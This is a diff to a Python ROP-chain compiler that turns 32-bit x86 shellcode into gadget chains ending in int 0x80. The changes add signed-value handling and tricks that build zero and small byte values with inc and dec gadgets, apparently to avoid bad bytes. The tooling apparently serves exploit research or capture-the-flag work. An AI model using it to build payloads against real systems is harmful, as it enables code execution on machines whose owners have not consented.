@@ -5,6 +5,9 @@ from struct import pack, unpack
 from ExecveBuilder import *
 from GadgetFinder import *
 
+def s32(value):
+    return -(value & 0x80000000) | (value & 0x7fffffff)
+
 class DisassemblyInstruction():
     def __init__(self, address, mnemonic, op_str):
         self.address = address
@@ -40,12 +43,14 @@ class ShellcodeCompiler():
             print("0x%x:\t%s\t%s" % (instruction.address, instruction.mnemonic, instruction.op_str))
 
     def add_instructions(self):
-        if self.req_int:
+        if self.req_int or self.req_stack:
             self.instructions.append(Instruction('pop ' + self.SRC, ['esp'], ['esp', self.SRC]))
             for reg in list(filter(lambda x: x != self.SRC, ['eax', 'ebx', 'ecx', 'edx'])):
                 self.instructions.append(Instruction('pop ' + reg, ['esp'], ['esp', reg]))
 
-            if self.SRC != 'eax': self.instructions.append(Instruction('xor eax, eax', ['esp'], ['esp']))
+            if self.SRC != 'eax': 
+                self.instructions.append(Instruction('inc ' + self.SRC, ['esp'], ['esp']))
+                self.instructions.append(Instruction('xor eax, eax', ['esp'], ['esp']))
             self.instructions.append(Instruction('inc eax', ['esp', 'eax'], ['esp', 'eax']))
             self.instructions.append(Instruction('int 0x80', ['esp', 'eax', 'ebx', 'ecx', 'edx'], ['esp']))
         
@@ -107,13 +112,24 @@ class ShellcodeCompiler():
         for idx, instruction in enumerate(self.disassembly):
             new_instruction = instruction.mnemonic + ' ' + instruction.op_str
             if instruction.mnemonic == 'push':
-                self.stack_size += 4
-                continue
-            if instruction.mnemonic == 'mov':
+                if self.disassembly[idx + 1].mnemonic == 'pop':
+                    pop_op = self.disassembly[idx + 1].op_str
+                    ar_op = 0
+                    try:
+                        push_op = instruction.op_str
+                        if push_op[0:2] == '0x' or push_op[0:2] == '-x': ar_op = s32(int(push_op, 16))
+                        else: ar_op = s32(int(push_op, 10))
+                        if ar_op > 0: new_instruction = 'inc ' + pop_op
+                        else: new_instruction = 'dec ' + pop_op
+                    except:
+                        self.stack_size += 4
+                else: continue
+            elif instruction.mnemonic == 'mov':
                 if instruction.op_str.split(',')[1].strip() == 'esp': continue
                 if instruction.op_str.split(',')[1].strip()[0:2] == '0x':
                     if instruction.op_str.split(',')[0] == 'al': new_instruction = 'inc eax'
-            if instruction.mnemonic == 'pop': pass
+            elif instruction.mnemonic == 'pop':
+                pass
 
             # Reserve esp unconditionally
             if 'esp' not in pre_reserve_snapshots[idx]: pre_reserve_snapshots[idx].append('esp')
@@ -135,6 +151,7 @@ class ShellcodeCompiler():
         gadget = self.gadgets['pop ' + reg]
         p = gadget.compile()
         print('pop ' + reg)
+        affected_byte_regs = []
         for r in gadget.side_pops:
             if r == reg: 
                 p += data
@@ -142,11 +159,26 @@ class ShellcodeCompiler():
                 print(s)
             else: 
                 if r in used_regs.keys(): 
-                    p += pack('<I', used_regs[r])
-                    print( str(hex(used_regs[r])))
+                    if used_regs[r] == 0:  
+                        p += pack('<I', 0xffffffff)
+                        print(str(hex(0xffffffff)))
+                    elif used_regs[r] < 256:
+                        p += pack('<I', 0xffffffff)
+                        print(str(hex(0xffffffff)))
+                        affected_byte_regs.append(r)
+                    else: 
+                        p += pack('<I', used_regs[r])
+                        print( str(hex(used_regs[r])))
                 else: 
                     p += pack('<I', 0x41414141)
                     print(hex(str(0x41414141)))
+        for r in affected_byte_regs:
+            value = used_regs[r]
+            inc_ins = 'inc' if value >= 0 else 'dec'
+            lbound = 1 if value < 0 else 0
+            for _ in range(lbound, abs(value) + (1 - lbound)): 
+                p += self.gadgets[inc_ins + ' ' + r].compile()
+                print(inc_ins + ' ' + r)
         return p
 
     def start(self, stdout, padding):
@@ -173,17 +205,51 @@ class ShellcodeCompiler():
         src_reg_reset = 0
         
         for idx, instruction in enumerate(self.disassembly):
-            if skip: continue
+            if skip: 
+                skip = False
+                continue
             print("\n\n0x%x:\t%s\t%s" % (instruction.address, instruction.mnemonic, instruction.op_str))
             print(str(regs) + "\n")
             if instruction.mnemonic == 'push':
-                if instruction.op_str[0:2] == '0x':
+                oparts = instruction.op_str.split(' ')
+                mode = None if len(oparts) != 2 else oparts[0]
+                op_val = instruction.op_str if mode != 'byte' else oparts[1]
+                if op_val[0:2] == '0x' or op_val[0] in [str(i) for i in range(1,10)] or op_val[1] in [str(i) for i in range(1,10)]:
+                    value = s32(int(op_val, 16)) if op_val[0:2] == '0x' else s32(int(op_val, 10))
                     if self.disassembly[idx + 1].mnemonic == 'pop':
-                        p += self.pad_pop_reg(self.disassembly[idx + 1].op_str, pack('<I', int(instruction.op_str, 16)), regs)
+                        if len(op_val) <= 5:
+                            pop_reg = self.disassembly[idx + 1].op_str
+                            p += self.pad_pop_reg(pop_reg, pack('<I', 0xffffffff), regs)
+                            inc_ins = 'inc' if value >= 0 else 'dec'
+                            lbound = 1 if value < 0 else 0
+                            for _ in range(lbound, abs(value) + 1): 
+                                p += self.gadgets[inc_ins + ' ' + pop_reg].compile()
+                                print(inc_ins + ' ' + pop_reg)
+                            regs[pop_reg] = value
                         skip = True
-                    else:
+                    elif len(op_val) == 4:
+                        # Use increase method to set eax to target byte
                         p += self.pad_pop_reg(self.DST, pack('<I', self.DATA + offset), regs)
-                        p += self.pad_pop_reg(self.SRC, pack('<I', int(instruction.op_str, 16)), regs)
+
+                        p += self.gadgets['xor ' + self.SRC + ", " + self.SRC].compile()
+                        print('xor ' + self.SRC + ", " + self.SRC)
+                        inc_ins = self.gadgets['inc eax'].compile() if value >= 0 else self.gadgets['dec eax'].compile()
+                        for _ in range(0, abs(value)): 
+                            p += inc_ins
+
+                            if value >= 0: print('inc eax')
+                            else: print('dec eax')
+
+                        p += self.gadgets['mov dword ptr [' + self.DST + '], ' + self.SRC].compile()
+                        print('mov dword ptr [' + self.DST + '], ' + self.SRC)
+
+                        if src_reg_reset == 0: p += self.gadgets['xor ' + self.SRC + ", " + self.SRC].compile()
+                        print('xor ' + self.SRC + ", " + self.SRC)
+                        offset -= 4
+                    else:
+                        # Use pop,movstack method to put target word on stack
+                        p += self.pad_pop_reg(self.DST, pack('<I', self.DATA + offset), regs)
+                        p += self.pad_pop_reg(self.SRC, pack('<I', int(op_val, 16)), regs)
                         p += self.gadgets['mov dword ptr [' + self.DST + '], ' + self.SRC].compile()
                         print('mov dword ptr [' + self.DST + '], ' + self.SRC)
 
@@ -214,7 +280,7 @@ class ShellcodeCompiler():
                     if dst in ['al']: dst = 'eax'
                     for _ in range(0, int(src, 16)): 
                         p += self.gadgets['inc ' + dst].compile() 
-                        print('inc ' + self.DST)
+                        print('inc ' + dst)
                 else:
                     p += self.gadgets[instruction.mnemonic + " " + instruction.op_str].compile()
                     print(instruction.mnemonic + " " + instruction.op_str)
